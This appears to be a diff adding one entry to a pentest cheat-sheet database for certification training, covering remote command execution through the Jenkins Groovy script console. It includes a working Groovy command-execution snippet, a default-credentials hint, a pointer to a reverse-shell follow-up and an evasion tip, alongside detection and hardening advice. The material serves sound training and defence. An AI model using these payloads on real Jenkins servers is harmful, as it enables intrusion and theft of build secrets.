@@ -1,0 +1,90 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "jenkins"
+  ],
+  "tags": [
+    "jenkins",
+    "groovy",
+    "rce"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Jenkins",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Open the Groovy script console",
+      "command": "# at http://jenkins.inlanefreight.local:8000/script"
+    },
+    {
+      "label": "Run a command via Groovy .execute()",
+      "command": "def cmd = 'id' ..."
+    },
+    {
+      "label": "Windows variant of the same one-liner",
+      "command": "# Windows: def cmd = \"cmd.exe /c dir\".execute(); println(\"${cmd.text}\");"
+    }
+  ],
+  "notes": "Default creds often admin:admin. Anonymous read + /script is a common misconfig.",
+  "references": [
+    {
+      "title": "Jenkins Security",
+      "url": "https://www.jenkins.io/security/"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "jenkins-groovy-revshell",
+      "note": "Escalate console RCE to a full reverse shell.",
+      "rel": "next"
+    }
+  ],
+  "id": "jenkins-script-console-rce",
+  "name": "Jenkins - Script Console Command Execution",
+  "command": "def cmd = '<command>'\ndef sout = new StringBuffer(), serr = new StringBuffer()\ndef proc = cmd.execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln sout",
+  "description": "The Jenkins Groovy script console (/script) runs code as the Jenkins user. This Groovy snippet executes an OS command and prints its output - instant RCE with admin (or misconfigured anonymous) access.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Jenkins' Script Console (/script) executes arbitrary Groovy code server-side as the Jenkins process user. Admin users can run system commands via Runtime.exec() -- Groovy has full JVM access with no sandboxing.",
+    "prerequisites": "Valid Jenkins admin credentials (or anonymous access if security disabled). Network access to Jenkins web interface.",
+    "impact": "Full RCE as Jenkins OS user. Access to all Jenkins credentials (build secrets, SSH keys, API tokens). Lateral movement to any system Jenkins reaches (often large CI/CD infrastructure).",
+    "detection": "POST requests to /script endpoint. Jenkins audit log (Audit Trail plugin) showing script execution. Unusual child processes spawned from Jenkins (bash, cmd). Network connection from Jenkins to attacker IP.",
+    "artifacts": "Jenkins access log (POST /script) | Audit Trail log (Groovy script execution) | Process audit log (bash spawned from java) | Jenkins credentials access log",
+    "prevention": "Use Matrix Authorization Strategy to grant Script Console access only to super-admins. Require 2FA for all Jenkins accounts. Monitor /script endpoint and alert on any POST.",
+    "misconfiguration": "Jenkins Script Console accessible to all admin users. No granular RBAC for script execution. No audit logging of script executions.",
+    "vulnerable_config": "# Jenkins default\n# /script accessible to all admin users\n# No additional authorization check for Groovy execution",
+    "secure_config": "# Matrix Authorization Strategy plugin\n# Grant Overall/RunScripts to super-admin only\n# Or restrict Jenkins behind VPN entirely\n# Audit Trail plugin: log all /script POSTs",
+    "evasion": "Route through a legitimate Jenkins build job shell step -- avoids /script endpoint detection.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1059.007",
+      "MITRE T1552.001"
+    ]
+  }
+}
